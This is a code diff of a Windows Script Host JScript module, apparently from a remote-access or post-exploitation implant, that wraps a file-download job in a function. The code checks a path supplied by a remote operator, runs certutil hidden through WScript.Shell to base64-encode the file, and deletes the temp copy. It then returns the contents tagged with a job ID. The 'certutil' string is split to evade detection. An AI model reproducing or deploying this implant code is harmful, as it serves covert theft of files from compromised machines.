@@ -24,19 +24,22 @@ deleteFile = function (pathname) {
     f.Delete();
 }
 
-try {
-    fso1 = new ActiveXObject("Scripting.FileSystemObject");
-    if (fso1.FileExists("~REMOTE_PATHNAME~")) {
-        tempout = fso1.GetSpecialFolder(2) + "\\" + uuid() + ".t" + "xt";
-        r = new ActiveXObject("WScript.Shell").Run("certut" + "il -encode " + " ~REMOTE_PATHNAME~ " + tempout,0,true);
-        d = readFile(tempout);
-        deleteFile(tempout);
-        c = "~JOB_ID~" + "|" + d;
+job = function () {
+    try {
+        fso1 = new ActiveXObject("Scripting.FileSystemObject");
+        if (fso1.FileExists("~REMOTE_PATHNAME~")) {
+            tempout = fso1.GetSpecialFolder(2) + "\\" + uuid() + ".t" + "xt";
+            r = new ActiveXObject("WScript.Shell").Run("certut" + "il -encode " + " ~REMOTE_PATHNAME~ " + tempout, 0, true);
+            d = readFile(tempout);
+            deleteFile(tempout);
+            return d;
+        }
+        else {
+            return "[download fail:File not exists]";
+        }
     }
-    else{
-        c = "~JOB_ID~" + "|" + "[download fail:File not exists]";
+    catch (ex) {
+        return "[download fail]";
     }
 }
-catch (ex) {
-    c = "~JOB_ID~" + "|" + "[download fail]";
-}
+c = "~JOB_ID~" + "|" + job();
